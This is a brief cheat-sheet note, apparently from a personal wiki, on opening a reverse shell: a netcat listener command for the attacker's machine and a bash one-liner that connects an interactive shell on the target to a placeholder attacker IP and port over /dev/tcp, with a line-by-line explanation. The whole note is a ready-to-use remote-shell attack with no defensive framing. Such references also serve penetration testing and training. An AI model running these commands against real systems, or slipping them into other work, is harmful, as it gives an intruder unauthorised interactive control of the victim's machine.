[[INDEX]] [[CHATGPT]]

# reverse shell  

## listen on the attacker pc  
`nc -vlp <PORT>` 

## create a reverse shell on the target pc in bash:
`bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1`  
- The bash -i command starts an interactive bash shell.
- The >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> redirects standard output and standard error to a TCP connection to the attacker's IP address and port number.
- The 0>&1 redirects standard input to the same TCP connection.


